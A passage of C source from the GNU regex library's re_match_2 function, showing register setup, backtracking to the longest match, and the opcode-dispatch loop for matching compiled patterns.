     treat `best_regend' differently than the rest.  So we keep track of
     the end of the best match so far in a separate variable.  We
     initialize this to NULL so that when we backtrack the first time
     and need to test it, it's not garbage.  */
  const char *match_end = NULL;

  /* Used when we pop values we don't care about.  */
#ifdef MATCH_MAY_ALLOCATE /* otherwise, these are global.  */
  const char **reg_dummy;
  register_info_type *reg_info_dummy;
#endif

#ifdef DEBUG
  /* Counts the total number of registers pushed.  */
  unsigned num_regs_pushed = 0; 	
#endif

  DEBUG_PRINT1 ("\n\nEntering re_match_2.\n");
  
  INIT_FAIL_STACK ();
  
#ifdef MATCH_MAY_ALLOCATE
  /* Do not bother to initialize all the register variables if there are
     no groups in the pattern, as it takes a fair amount of time.  If
     there are groups, we include space for register 0 (the whole
     pattern), even though we never use it, since it simplifies the
     array indexing.  We should fix this.  */
  if (bufp->re_nsub)
    {
      regstart = REGEX_TALLOC (num_regs, const char *);
      regend = REGEX_TALLOC (num_regs, const char *);
      old_regstart = REGEX_TALLOC (num_regs, const char *);
      old_regend = REGEX_TALLOC (num_regs, const char *);
      best_regstart = REGEX_TALLOC (num_regs, const char *);
      best_regend = REGEX_TALLOC (num_regs, const char *);
      reg_info = REGEX_TALLOC (num_regs, register_info_type);
      reg_dummy = REGEX_TALLOC (num_regs, const char *);
      reg_info_dummy = REGEX_TALLOC (num_regs, register_info_type);

      if (!(regstart && regend && old_regstart && old_regend && reg_info 
            && best_regstart && best_regend && reg_dummy && reg_info_dummy)) 
        {
          FREE_VARIABLES ();
          return -2;
        }
    }
#if defined (REGEX_MALLOC)
  else
    {
      /* We must initialize all our variables to NULL, so that
         `FREE_VARIABLES' doesn't try to free them.  */
      regstart = regend = old_regstart = old_regend = best_regstart
        = best_regend = reg_dummy = NULL;
      reg_info = reg_info_dummy = (register_info_type *) NULL;
    }
#endif /* REGEX_MALLOC */
#endif /* MATCH_MAY_ALLOCATE */

  /* The starting position is bogus.  */
  if (pos < 0 || pos > size1 + size2)
    {
      FREE_VARIABLES ();
      return -1;
    }
    
  /* Initialize subexpression text positions to -1 to mark ones that no
     start_memory/stop_memory has been seen for. Also initialize the
     register information struct.  */
  for (mcnt = 1; mcnt < num_regs; mcnt++)
    {
      regstart[mcnt] = regend[mcnt] 
        = old_regstart[mcnt] = old_regend[mcnt] = REG_UNSET_VALUE;
        
      REG_MATCH_NULL_STRING_P (reg_info[mcnt]) = MATCH_NULL_UNSET_VALUE;
      IS_ACTIVE (reg_info[mcnt]) = 0;
      MATCHED_SOMETHING (reg_info[mcnt]) = 0;
      EVER_MATCHED_SOMETHING (reg_info[mcnt]) = 0;
    }
  
  /* We move `string1' into `string2' if the latter's empty -- but not if
     `string1' is null.  */
  if (size2 == 0 && string1 != NULL)
    {
      string2 = string1;
      size2 = size1;
      string1 = 0;
      size1 = 0;
    }
  end1 = string1 + size1;
  end2 = string2 + size2;

  /* Compute where to stop matching, within the two strings.  */
  if (stop <= size1)
    {
      end_match_1 = string1 + stop;
      end_match_2 = string2;
    }
  else
    {
      end_match_1 = end1;
      end_match_2 = string2 + stop - size1;
    }

  /* `p' scans through the pattern as `d' scans through the data. 
     `dend' is the end of the input string that `d' points within.  `d'
     is advanced into the following input string whenever necessary, but
     this happens before fetching; therefore, at the beginning of the
     loop, `d' can be pointing at the end of a string, but it cannot
     equal `string2'.  */
  if (size1 > 0 && pos <= size1)
    {
      d = string1 + pos;
      dend = end_match_1;
    }
  else
    {
      d = string2 + pos - size1;
      dend = end_match_2;
    }

  DEBUG_PRINT1 ("The compiled pattern is: ");
  DEBUG_PRINT_COMPILED_PATTERN (bufp, p, pend);
  DEBUG_PRINT1 ("The string to match is: `");
  DEBUG_PRINT_DOUBLE_STRING (d, string1, size1, string2, size2);
  DEBUG_PRINT1 ("'\n");
  
  /* This loops over pattern commands.  It exits by returning from the
     function if the match is complete, or it drops through if the match
     fails at this starting point in the input data.  */
  for (;;)
    {
      DEBUG_PRINT2 ("\n0x%x: ", p);

      if (p == pend)
	{ /* End of pattern means we might have succeeded.  */
          DEBUG_PRINT1 ("end of pattern ... ");
          
	  /* If we haven't matched the entire string, and we want the
             longest match, try backtracking.  */
          if (d != end_match_2)
	    {
	      /* 1 if this match ends in the same string (string1 or string2)
		 as the best previous match.  */
	      boolean same_str_p = (FIRST_STRING_P (match_end) 
				    == MATCHING_IN_FIRST_STRING);
	      /* 1 if this match is the best seen so far.  */
	      boolean best_match_p;

	      /* AIX compiler got confused when this was combined
		 with the previous declaration.  */
	      if (same_str_p)
		best_match_p = d > match_end;
	      else
		best_match_p = !MATCHING_IN_FIRST_STRING;

              DEBUG_PRINT1 ("backtracking.\n");
              
              if (!FAIL_STACK_EMPTY ())
                { /* More failure points to try.  */

                  /* If exceeds best match so far, save it.  */
                  if (!best_regs_set || best_match_p)
                    {
                      best_regs_set = true;
                      match_end = d;
                      
                      DEBUG_PRINT1 ("\nSAVING match as best so far.\n");
                      
                      for (mcnt = 1; mcnt < num_regs; mcnt++)
                        {
                          best_regstart[mcnt] = regstart[mcnt];
                          best_regend[mcnt] = regend[mcnt];
                        }
                    }
                  goto fail;	       
                }

              /* If no failure points, don't restore garbage.  And if
                 last match is real best match, don't restore second
                 best one. */
              else if (best_regs_set && !best_match_p)
                {
  	        restore_best_regs:
                  /* Restore best match.  It may happen that `dend ==
                     end_match_1' while the restored d is in string2.
                     For example, the pattern `x.*y.*z' against the
                     strings `x-' and `y-z-', if the two strings are
                     not consecutive in memory.  */
                  DEBUG_PRINT1 ("Restoring best registers.\n");
                  
                  d = match_end;
                  dend = ((d >= string1 && d <= end1)
		           ? end_match_1 : end_match_2);

		  for (mcnt = 1; mcnt < num_regs; mcnt++)
		    {
		      regstart[mcnt] = best_regstart[mcnt];
		      regend[mcnt] = best_regend[mcnt];
		    }
                }
            } /* d != end_match_2 */

          DEBUG_PRINT1 ("Accepting match.\n");

          /* If caller wants register contents data back, do it.  */
          if (regs && !bufp->no_sub)
	    {
              /* Have the register data arrays been allocated?  */
              if (bufp->regs_allocated == REGS_UNALLOCATED)
                { /* No.  So allocate them with malloc.  We need one
                     extra element beyond `num_regs' for the `-1' marker
                     GNU code uses.  */
                  regs->num_regs = MAX (RE_NREGS, num_regs + 1);
                  regs->start = TALLOC (regs->num_regs, regoff_t);
                  regs->end = TALLOC (regs->num_regs, regoff_t);
                  if (regs->start == NULL || regs->end == NULL)
                    return -2;
                  bufp->regs_allocated = REGS_REALLOCATE;
                }
              else if (bufp->regs_allocated == REGS_REALLOCATE)
                { /* Yes.  If we need more elements than were already
                     allocated, reallocate them.  If we need fewer, just
                     leave it alone.  */
                  if (regs->num_regs < num_regs + 1)
                    {
                      regs->num_regs = num_regs + 1;
                      RETALLOC (regs->start, regs->num_regs, regoff_t);
                      RETALLOC (regs->end, regs->num_regs, regoff_t);
                      if (regs->start == NULL || regs->end == NULL)
                        return -2;
                    }
                }
              else
		{
		  /* These braces fend off a "empty body in an else-statement"
		     warning under GCC when assert expands to nothing.  */
		  assert (bufp->regs_allocated == REGS_FIXED);
		}

              /* Convert the pointer data in `regstart' and `regend' to
                 indices.  Register zero has to be set differently,
                 since we haven't kept track of any info for it.  */
              if (regs->num_regs > 0)
                {
                  regs->start[0] = pos;
                  regs->end[0] = (MATCHING_IN_FIRST_STRING
				  ? ((regoff_t) (d - string1))
			          : ((regoff_t) (d - string2 + size1)));
                }
              
              /* Go through the first `min (num_regs, regs->num_regs)'
                 registers, since that is all we initialized.  */
	      for (mcnt = 1; mcnt < MIN (num_regs, regs->num_regs); mcnt++)
		{
                  if (REG_UNSET (regstart[mcnt]) || REG_UNSET (regend[mcnt]))
                    regs->start[mcnt] = regs->end[mcnt] = -1;
                  else
                    {
		      regs->start[mcnt]
			= (regoff_t) POINTER_TO_OFFSET (regstart[mcnt]);
                      regs->end[mcnt]
			= (regoff_t) POINTER_TO_OFFSET (regend[mcnt]);
                    }
		}
              
              /* If the regs structure we return has more elements than
                 were in the pattern, set the extra elements to -1.  If
                 we (re)allocated the registers, this is the case,
                 because we always allocate enough to have at least one
                 -1 at the end.  */
              for (mcnt = num_regs; mcnt < regs->num_regs; mcnt++)
                regs->start[mcnt] = regs->end[mcnt] = -1;
	    } /* regs && !bufp->no_sub */

          FREE_VARIABLES ();
          DEBUG_PRINT4 ("%u failure points pushed, %u popped (%u remain).\n",
                        nfailure_points_pushed, nfailure_points_popped,
                        nfailure_points_pushed - nfailure_points_popped);
          DEBUG_PRINT2 ("%u registers pushed.\n", num_regs_pushed);

          mcnt = d - pos - (MATCHING_IN_FIRST_STRING 
			    ? string1 
			    : string2 - size1);

          DEBUG_PRINT2 ("Returning %d from re_match_2.\n", mcnt);

          return mcnt;
        }

      /* Otherwise match next pattern command.  */
#ifdef SWITCH_ENUM_BUG
      switch ((int) ((re_opcode_t) *p++))
#else
      switch ((re_opcode_t) *p++)
#endif
	{
        /* Ignore these.  Used to ignore the n of succeed_n's which
           currently have n == 0.  */
        case no_op:
          DEBUG_PRINT1 ("EXECUTING no_op.\n");
          break;


        /* Match the next n pattern characters exactly.  The following
           byte in the pattern defines n, and the n bytes after that
           are the characters to match.  */
	case exactn:
	  mcnt = *p++;
          DEBUG_PRINT2 ("EXECUTING exactn %d.\n", mcnt);

          /* This is written out as an if-else so we don't waste time
             testing `translate' inside the loop.  */
          if (translate)
	    {
	      do
		{
		  PREFETCH ();
		  if (translate[(unsigned char) *d++] != (char) *p++)
                    goto fail;
		}
	      while (--mcnt);
	    }
	  else
	    {
	      do
		{
		  PREFETCH ();
		  if (*d++ != (char) *p++) goto fail;
		}
	      while (--mcnt);
	    }
	  SET_REGS_MATCHED ();
          break;


        /* Match any character except possibly a newline or a null.  */
	case anychar:
          DEBUG_PRINT1 ("EXECUTING anychar.\n");

          PREFETCH ();

          if ((!(bufp->syntax & RE_DOT_NEWLINE) && TRANSLATE (*d) == '\n')
              || (bufp->syntax & RE_DOT_NOT_NULL && TRANSLATE (*d) == '\000'))
	    goto fail;

          SET_REGS_MATCHED ();
          DEBUG_PRINT2 ("  Matched `%d'.\n", *d);
          d++;
	  break;


	case charset:
	case charset_not:
	  {
	    register unsigned char c;
	    boolean not = (re_opcode_t) *(p - 1) == charset_not;

            DEBUG_PRINT2 ("EXECUTING charset%s.\n", not ? "_not" : "");

	    PREFETCH ();
	    c = TRANSLATE (*d); /* The character to match.  */

            /* Cast to `unsigned' instead of `unsigned char' in case the
               bit list is a full 32 bytes long.  */
	    if (c < (unsigned) (*p * BYTEWIDTH)
		&& p[1 + c / BYTEWIDTH] & (1 << (c % BYTEWIDTH)))
	      not = !not;

	    p += 1 + *p;

	    if (!not) goto fail;
            
	    SET_REGS_MATCHED ();
            d++;
	    break;
	  }


        /* The beginning of a group is represented by start_memory.
           The arguments are the register number in the next byte, and the
           number of groups inner to this one in the next.  The text
           matched within the group is recorded (in the internal
           registers data structure) under the register number.  */
        case start_memory:
	  DEBUG_PRINT3 ("EXECUTING start_memory %d (%d):\n", *p, p[1]);

          /* Find out if this group can match the empty string.  */
	  p1 = p;		/* To send to group_match_null_string_p.  */
          
          if (REG_MATCH_NULL_STRING_P (reg_info[*p]) == MATCH_NULL_UNSET_VALUE)
            REG_MATCH_NULL_STRING_P (reg_info[*p]) 
              = group_match_null_string_p (&p1, pend, reg_info);

          /* Save the position in the string where we were the last time
             we were at this open-group operator in case the group is
             operated upon by a repetition operator, e.g., with `(a*)*b'
             against `ab'; then we want to ignore where we are now in
             the string in case this attempt to match fails.  */
          old_regstart[*p] = REG_MATCH_NULL_STRING_P (reg_info[*p])
                             ? REG_UNSET (regstart[*p]) ? d : regstart[*p]
                             : regstart[*p];
	  DEBUG_PRINT2 ("  old_regstart: %d\n", 
			 POINTER_TO_OFFSET (old_regstart[*p]));

          regstart[*p] = d;
	  DEBUG_PRINT2 ("  regstart: %d\n", POINTER_TO_OFFSET (regstart[*p]));

          IS_ACTIVE (reg_info[*p]) = 1;
          MATCHED_SOMETHING (reg_info[*p]) = 0;
          
          /* This is the new highest active register.  */
          highest_active_reg = *p;
          
          /* If nothing was active before, this is the new lowest active
             register.  */
          if (lowest_active_reg == NO_LOWEST_ACTIVE_REG)
            lowest_active_reg = *p;

          /* Move past the register number and inner group count.  */
          p += 2;
	  just_past_start_mem = p;
          break;


        /* The stop_memory opcode represents the end of a group.  Its
           arguments are the same as start_memory's: the register
           number, and the number of inner groups.  */
	case stop_memory:
	  DEBUG_PRINT3 ("EXECUTING stop_memory %d (%d):\n", *p, p[1]);
             
          /* We need to save the string position the last time we were at
             this close-group operator in case the group is operated
             upon by a repetition operator, e.g., with `((a*)*(b*)*)*'
             against `aba'; then we want to ignore where we are now in
             the string in case this attempt to match fails.  */
          old_regend[*p] = REG_MATCH_NULL_STRING_P (reg_info[*p])
                           ? REG_UNSET (regend[*p]) ? d : regend[*p]
			   : regend[*p];
	  DEBUG_PRINT2 ("      old_regend: %d\n", 
			 POINTER_TO_OFFSET (old_regend[*p]));

          regend[*p] = d;
	  DEBUG_PRINT2 ("      regend: %d\n", POINTER_TO_OFFSET (regend[*p]));

          /* This register isn't active anymore.  */
          IS_ACTIVE (reg_info[*p]) = 0;
          
          /* If this was the only register active, nothing is active
             anymore.  */
          if (lowest_active_reg == highest_active_reg)
            {
              lowest_active_reg = NO_LOWEST_ACTIVE_REG;
              highest_active_reg = NO_HIGHEST_ACTIVE_REG;
            }
          else
            { /* We must scan for the new highest active register, since
                 it isn't necessarily one less than now: consider
                 (a(b)c(d(e)f)g).  When group 3 ends, after the f), the
                 new highest active register is 1.  */
              unsigned char r = *p - 1;
              while (r > 0 && !IS_ACTIVE (reg_info[r]))
                r--;
              
              /* If we end up at register zero, that means that we saved
                 the registers as the result of an `on_failure_jump', not
                 a `start_memory', and we jumped to past the innermost
                 `stop_memory'.  For example, in ((.)*) we save
                 registers 1 and 2 as a result of the *, but when we pop
                 back to the second ), we are at the stop_memory 1.
                 Thus, nothing is active.  */
	      if (r == 0)
                {
                  lowest_active_reg = NO_LOWEST_ACTIVE_REG;
                  highest_active_reg = NO_HIGHEST_ACTIVE_REG;
                }
              else
                highest_active_reg = r;
            }
          
          /* If just failed to match something this time around with a
             group that's operated on by a repetition operator, try to
             force exit from the ``loop'', and restore the register
             information for this group that we had before trying this
             last match.  */
          if ((!MATCHED_SOMETHING (reg_info[*p])
               || just_past_start_mem == p - 1)
	      && (p + 2) < pend)              
            {
              boolean is_a_jump_n = false;
              
              p1 = p + 2;
              mcnt = 0;
              switch ((re_opcode_t) *p1++)
                {
                  case jump_n:
		    is_a_jump_n = true;
                  case pop_failure_jump:
		  case maybe_pop_jump:
		  case jump:
		  case dummy_failure_jump:
                    EXTRACT_NUMBER_AND_INCR (mcnt, p1);
		    if (is_a_jump_n)
		      p1 += 2;
                    break;
                  
                  default:
                    /* do nothing */ ;
                }
	      p1 += mcnt;
        
              /* If the next operation is a jump backwards in the pattern
	         to an on_failure_jump right before the start_memory
                 corresponding to this stop_memory, exit from the loop
                 by forcing a failure after pushing on the stack the
                 on_failure_jump's jump in the pattern, and d.  */
              if (mcnt < 0 && (re_opcode_t) *p1 == on_failure_jump
                  && (re_opcode_t) p1[3] == start_memory && p1[4] == *p)
		{
                  /* If this group ever matched anything, then restore
                     what its registers were before trying this last
                     failed match, e.g., with `(a*)*b' against `ab' for
                     regstart[1], and, e.g., with `((a*)*(b*)*)*'
                     against `aba' for regend[3].
                     
                     Also restore the registers for inner groups for,
                     e.g., `((a*)(b*))*' against `aba' (register 3 would
                     otherwise get trashed).  */
                     
                  if (EVER_MATCHED_SOMETHING (reg_info[*p]))
		    {
		      unsigned r; 
        
                      EVER_MATCHED_SOMETHING (reg_info[*p]) = 0;
                      
		      /* Restore this and inner groups' (if any) registers.  */
                      for (r = *p; r < *p + *(p + 1); r++)
                        {
                          regstart[r] = old_regstart[r];

                          /* xx why this test?  */
                          if ((int) old_regend[r] >= (int) regstart[r])
                            regend[r] = old_regend[r];
                        }     
                    }
		  p1++;
                  EXTRACT_NUMBER_AND_INCR (mcnt, p1);
                  PUSH_FAILURE_POINT (p1 + mcnt, d, -2);

                  goto fail;
                }
            }
          
          /* Move past the register number and the inner group count.  */
          p += 2;
          break;


	/* \<digit> has been turned into a `duplicate' command which is
           followed by the numeric value of <digit> as the register number.  */
        case duplicate:
	  {
	    register const char *d2, *dend2;
	    int regno = *p++;   /* Get which register to match against.  */
	    DEBUG_PRINT2 ("EXECUTING duplicate %d.\n", regno);

	    /* Can't back reference a group which we've never matched.  */
            if (REG_UNSET (regstart[regno]) || REG_UNSET (regend[regno]))
              goto fail;
              
            /* Where in input to try to start matching.  */
            d2 = regstart[regno];
            
            /* Where to stop matching; if both the place to start and
               the place to stop matching are in the same string, then
               set to the place to stop, otherwise, for now have to use
               the end of the first string.  */

            dend2 = ((FIRST_STRING_P (regstart[regno]) 
		      == FIRST_STRING_P (regend[regno]))
		     ? regend[regno] : end_match_1);
	    for (;;)
	      {
		/* If necessary, advance to next segment in register
                   contents.  */
		while (d2 == dend2)
		  {
		    if (dend2 == end_match_2) break;
		    if (dend2 == regend[regno]) break;

                    /* End of string1 => advance to string2. */
                    d2 = string2;
                    dend2 = regend[regno];
		  }
		/* At end of register contents => success */
		if (d2 == dend2) break;

		/* If necessary, advance to next segment in data.  */
		PREFETCH ();

		/* How many characters left in this segment to match.  */
		mcnt = dend - d;
                
		/* Want how many consecutive characters we can match in
                   one shot, so, if necessary, adjust the count.  */
                if (mcnt > dend2 - d2)
		  mcnt = dend2 - d2;
                  
		/* Compare that many; failure if mismatch, else move
                   past them.  */
		if (translate 
                    ? bcmp_translate (d, d2, mcnt, translate) 
                    : bcmp (d, d2, mcnt))
		  goto fail;
		d += mcnt, d2 += mcnt;
	      }
	  }
	  break;


        /* begline matches the empty string at the beginning of the string
           (unless `not_bol' is set in `bufp'), and, if
           `newline_anchor' is set, after newlines.  */
	case begline:
          DEBUG_PRINT1 ("EXECUTING begline.\n");
          
          if (AT_STRINGS_BEG (d))
            {
              if (!bufp->not_bol) break;
            }
          else if (d[-1] == '\n' && bufp->newline_anchor)
            {
              break;
            }
          /* In all other cases, we fail.  */
          goto fail;


        /* endline is the dual of begline.  */
	case endline:
          DEBUG_PRINT1 ("EXECUTING endline.\n");

          if (AT_STRINGS_END (d))
            {
              if (!bufp->not_eol) break;
            }
          
          /* We have to ``prefetch'' the next character.  */
          else if ((d == end1 ? *string2 : *d) == '\n'
                   && bufp->newline_anchor)
            {
              break;
            }
          goto fail;


	/* Match at the very beginning of the data.  */
        case begbuf:
          DEBUG_PRINT1 ("EXECUTING begbuf.\n");
          if (AT_STRINGS_BEG (d))
            break;
          goto fail;


	/* Match at the very end of the data.  */
        case endbuf:
          DEBUG_PRINT1 ("EXECUTING endbuf.\n");
	  if (AT_STRINGS_END (d))
	    break;
          goto fail;


        /* on_failure_keep_string_jump is used to optimize `.*\n'.  It
           pushes NULL as the value for the string on the stack.  Then
           `pop_failure_point' will keep the current value for the
           string, instead of restoring it.  To see why, consider
           matching `foo\nbar' against `.*\n'.  The .* matches the foo;
           then the . fails against the \n.  But the next thing we want
           to do is match the \n against the \n; if we restored the
           string value, we would be back at the foo.
           
           Because this is used only in specific cases, we don't need to
           check all the things that `on_failure_jump' does, to make
           sure the right things get saved on the stack.  Hence we don't
           share its code.  The only reason to push anything on the
           stack at all is that otherwise we would have to change
           `anychar's code to do something besides goto fail in this
           case; that seems worse than this.  */
        case on_failure_keep_string_jump:
          DEBUG_PRINT1 ("EXECUTING on_failure_keep_string_jump");
          
          EXTRACT_NUMBER_AND_INCR (mcnt, p);
          DEBUG_PRINT3 (" %d (to 0x%x):\n", mcnt, p + mcnt);

          PUSH_FAILURE_POINT (p + mcnt, NULL, -2);
          break;


	/* Uses of on_failure_jump:
        
           Each alternative starts with an on_failure_jump that points
           to the beginning of the next alternative.  Each alternative
           except the last ends with a jump that in effect jumps past
           the rest of the alternatives.  (They really jump to the
           ending jump of the following alternative, because tensioning
           these jumps is a hassle.)

           Repeats start with an on_failure_jump that points past both
           the repetition text and either the following jump or
           pop_failure_jump back to this on_failure_jump.  */
	case on_failure_jump:
        on_failure:
          DEBUG_PRINT1 ("EXECUTING on_failure_jump");

          EXTRACT_NUMBER_AND_INCR (mcnt, p);
          DEBUG_PRINT3 (" %d (to 0x%x)", mcnt, p + mcnt);

          /* If this on_failure_jump comes right before a group (i.e.,
             the original * applied to a group), save the information
             for that group and all inner ones, so that if we fail back
             to this point, the group's information will be correct.
             For example, in \(a*\)*\1, we need the preceding group,
             and in \(\(a*\)b*\)\2, we need the inner group.  */

          /* We can't use `p' to check ahead because we push
             a failure point to `p + mcnt' after we do this.  */
          p1 = p;

          /* We need to skip no_op's before we look for the
             start_memory in case this on_failure_jump is happening as
             the result of a completed succeed_n, as in \(a\)\{1,3\}b\1
             against aba.  */
          while (p1 < pend && (re_opcode_t) *p1 == no_op)
            p1++;

          if (p1 < pend && (re_opcode_t) *p1 == start_memory)
            {
              /* We have a new highest active register now.  This will
                 get reset at the start_memory we are about to get to,
                 but we will have saved all the registers relevant to
                 this repetition op, as described above.  */
              highest_active_reg = *(p1 + 1) + *(p1 + 2);
              if (lowest_active_reg == NO_LOWEST_ACTIVE_REG)
                lowest_active_reg = *(p1 + 1);
            }

          DEBUG_PRINT1 (":\n");
          PUSH_FAILURE_POINT (p + mcnt, d, -2);
          break;


        /* A smart repeat ends with `maybe_pop_jump'.
	   We change it to either `pop_failure_jump' or `jump'.  */
        case maybe_pop_jump:
          EXTRACT_NUMBER_AND_INCR (mcnt, p);
          DEBUG_PRINT2 ("EXECUTING maybe_pop_jump %d.\n", mcnt);
          {
	    register unsigned char *p2 = p;

            /* Compare the beginning of the repeat with what in the
               pattern follows its end. If we can establish that there
               is nothing that they would both match, i.e., that we
               would have to backtrack because of (as in, e.g., `a*a')
               then we can change to pop_failure_jump, because we'll
               never have to backtrack.
               
               This is not true in the case of alternatives: in
               `(a|ab)*' we do need to backtrack to the `ab' alternative
               (e.g., if the string was `ab').  But instead of trying to
               detect that here, the alternative has put on a dummy
               failure point which is what we will end up popping.  */

	    /* Skip over open/close-group commands.
	       If what follows this loop is a ...+ construct,
	       look at what begins its body, since we will have to
	       match at least one of that.  */
	    while (1)
	      {
		if (p2 + 2 < pend
		    && ((re_opcode_t) *p2 == stop_memory
			|| (re_opcode_t) *p2 == start_memory))
		  p2 += 3;
		else if (p2 + 6 < pend
			 && (re_opcode_t) *p2 == dummy_failure_jump)
		  p2 += 6;
		else
		  break;
	      }

	    p1 = p + mcnt;
	    /* p1[0] ... p1[2] are the `on_failure_jump' corresponding
	       to the `maybe_finalize_jump' of this case.  Examine what 
	       follows.  */

            /* If we're at the end of the pattern, we can change.  */
            if (p2 == pend)
	      {
		/* Consider what happens when matching ":\(.*\)"
		   against ":/".  I don't really understand this code
		   yet.  */
  	        p[-3] = (unsigned char) pop_failure_jump;
                DEBUG_PRINT1
                  ("  End of pattern: change to `pop_failure_jump'.\n");
              }

            else if ((re_opcode_t) *p2 == exactn
		     || (bufp->newline_anchor && (re_opcode_t) *p2 == endline))
	      {
		register unsigned char c
                  = *p2 == (unsigned char) endline ? '\n' : p2[2];

                if ((re_opcode_t) p1[3] == exactn && p1[5] != c)
                  {
  		    p[-3] = (unsigned char) pop_failure_jump;
                    DEBUG_PRINT3 ("  %c != %c => pop_failure_jump.\n",
                                  c, p1[5]);
                  }
                  
		else if ((re_opcode_t) p1[3] == charset
			 || (re_opcode_t) p1[3] == charset_not)
		  {
		    int not = (re_opcode_t) p1[3] == charset_not;
                    
		    if (c < (unsigned char) (p1[4] * BYTEWIDTH)
			&& p1[5 + c / BYTEWIDTH] & (1 << (c % BYTEWIDTH)))
		      not = !not;

                    /* `not' is equal to 1 if c would match, which means
                        that we can't change to pop_failure_jump.  */
		    if (!not)
                      {
  		        p[-3] = (unsigned char) pop_failure_jump;
                        DEBUG_PRINT1 ("  No match => pop_failure_jump.\n");
                      }
		  }
	      }
            else if ((re_opcode_t) *p2 == charset)
	      {
#ifdef DEBUG
		register unsigned char c
                  = *p2 == (unsigned char) endline ? '\n' : p2[2];
#endif

                if ((re_opcode_t) p1[3] == exactn
		    && ! ((int) p2[1] * BYTEWIDTH > (int) p1[4]
			  && (p2[1 + p1[4] / BYTEWIDTH]
			      & (1 << (p1[4] % BYTEWIDTH)))))
                  {
  		    p[-3] = (unsigned char) pop_failure_jump;
                    DEBUG_PRINT3 ("  %c != %c => pop_failure_jump.\n",
                                  c, p1[5]);
                  }
                  
		else if ((re_opcode_t) p1[3] == charset_not)
		  {
		    int idx;
		    /* We win if the charset_not inside the loop
		       lists every character listed in the charset after.  */
		    for (idx = 0; idx < (int) p2[1]; idx++)
		      if (! (p2[2 + idx] == 0
			     || (idx < (int) p1[4]
				 && ((p2[2 + idx] & ~ p1[5 + idx]) == 0))))
			break;

		    if (idx == p2[1])
                      {
  		        p[-3] = (unsigned char) pop_failure_jump;
                        DEBUG_PRINT1 ("  No match => pop_failure_jump.\n");
                      }
		  }
		else if ((re_opcode_t) p1[3] == charset)
		  {
		    int idx;
		    /* We win if the charset inside the loop
		       has no overlap with the one after the loop.  */
		    for (idx = 0;
			 idx < (int) p2[1] && idx < (int) p1[4];
			 idx++)
		      if ((p2[2 + idx] & p1[5 + idx]) != 0)
			break;

		    if (idx == p2[1] || idx == p1[4])
                      {
  		        p[-3] = (unsigned char) pop_failure_jump;
                        DEBUG_PRINT1 ("  No match => pop_failure_jump.\n");
                      }
		  }
	      }
	  }
	  p -= 2;		/* Point at relative address again.  */
	  if ((re_opcode_t) p[-1] != pop_failure_jump)
	    {
	      p[-1] = (unsigned char) jump;
              DEBUG_PRINT1 ("  Match => jump.\n");
	      goto unconditional_jump;
	    }
        /* Note fall through.  */


	/* The end of a simple repeat has a pop_failure_jump back to
           its matching on_failure_jump, where the latter will push a
           failure point.  The pop_failure_jump takes off failure
           points put on by this pop_failure_jump's matching
           on_failure_jump; we got through the pattern to here from the
           matching on_failure_jump, so didn't fail.  */
        case pop_failure_jump:
          {
            /* We need to pass separate storage for the lowest and
               highest registers, even though we don't care about the
               actual values.  Otherwise, we will restore only one
               register from the stack, since lowest will == highest in
               `pop_failure_point'.  */
            unsigned dummy_low_reg, dummy_high_reg;
            unsigned char *pdummy;
            const char *sdummy;

            DEBUG_PRINT1 ("EXECUTING pop_failure_jump.\n");
            POP_FAILURE_POINT (sdummy, pdummy,
                               dummy_low_reg, dummy_high_reg,
                               reg_dummy, reg_dummy, reg_info_dummy);
          }
          /* Note fall through.  */

          
        /* Unconditionally jump (without popping any failure points).  */
        case jump:
	unconditional_jump:
	  EXTRACT_NUMBER_AND_INCR (mcnt, p);	/* Get the amount to jump.  */
          DEBUG_PRINT2 ("EXECUTING jump %d ", mcnt);
	  p += mcnt;				/* Do the jump.  */
          DEBUG_PRINT2 ("(to 0x%x).\n", p);
	  break;

	
        /* We need this opcode so we can detect where alternatives end
           in `group_match_null_string_p' et al.  */
        case jump_past_alt:
          DEBUG_PRINT1 ("EXECUTING jump_past_alt.\n");
          goto unconditional_jump;


        /* Normally, the on_failure_jump pushes a failure point, which
           then gets popped at pop_failure_jump.  We will end up at
           pop_failure_jump, also, and with a pattern of, say, `a+', we
           are skipping over the on_failure_jump, so we have to push
           something meaningless for pop_failure_jump to pop.  */
        case dummy_failure_jump:
          DEBUG_PRINT1 ("EXECUTING dummy_failure_jump.\n");
          /* It doesn't matter what we push for the string here.  What
             the code at `fail' tests is the value for the pattern.  */
          PUSH_FAILURE_POINT (0, 0, -2);
          goto unconditional_jump;


        /* At the end of an alternative, we need to push a dummy failure
           point in case we are followed by a `pop_failure_jump', because
           we don't want the failure point for the alternative to be
           popped.  For example, matching `(a|ab)*' against `aab'
           requires that we match the `ab' alternative.  */
        case push_dummy_failure:
          DEBUG_PRINT1 ("EXECUTING push_dummy_failure.\n");
          /* See comments just above at `dummy_failure_jump' about the
             two zeroes.  */
          PUSH_FAILURE_POINT (0, 0, -2);
          break;

        /* Have to succeed matching what follows at least n times.
           After that, handle like `on_failure_jump'.  */
        case succeed_n: 
          EXTRACT_NUMBER (mcnt, p + 2);
          DEBUG_PRINT2 ("EXECUTING succeed_n %d.\n", mcnt);

          assert (mcnt >= 0);
          /* Originally, this is how many times we HAVE to succeed.  */
          if (mcnt > 0)
            {
               mcnt--;
	       p += 2;
               STORE_NUMBER_AND_INCR (p, mcnt);
               DEBUG_PRINT3 ("  Setting 0x%x to %d.\n", p, mcnt);
            }
	  else if (mcnt == 0)
            {
              DEBUG_PRINT2 ("  Setting two bytes from 0x%x to no_op.\n", p+2);
	      p[2] = (unsigned char) no_op;
              p[3] = (unsigned char) no_op;
              goto on_failure;
            }
          break;
        
        case jump_n: 
          EXTRACT_NUMBER (mcnt, p + 2);
          DEBUG_PRINT2 ("EXECUTING jump_n %d.\n", mcnt);

          /* Originally, this is how many times we CAN jump.  */
          if (mcnt)
            {
               mcnt--;
               STORE_NUMBER (p + 2, mcnt);
	       goto unconditional_jump;	     
            }
          /* If don't have to jump any more, skip over the rest of command.  */
	  else      
	    p += 4;		     
          break;
        
	case set_number_at:
	  {
            DEBUG_PRINT1 ("EXECUTING set_number_at.\n");

            EXTRACT_NUMBER_AND_INCR (mcnt, p);
            p1 = p + mcnt;
            EXTRACT_NUMBER_AND_INCR (mcnt, p);
            DEBUG_PRINT3 ("  Setting 0x%x to %d.\n", p1, mcnt);
	    STORE_NUMBER (p1, mcnt);
            break;
          }

        case wordbound:
          DEBUG_PRINT1 ("EXECUTING wordbound.\n");
          if (AT_WORD_BOUNDARY (d))
	    break;
          goto fail;

	case notwordbound:
          DEBUG_PRINT1 ("EXECUTING notwordbound.\n");
	  if (AT_WORD_BOUNDARY (d))
	    goto fail;
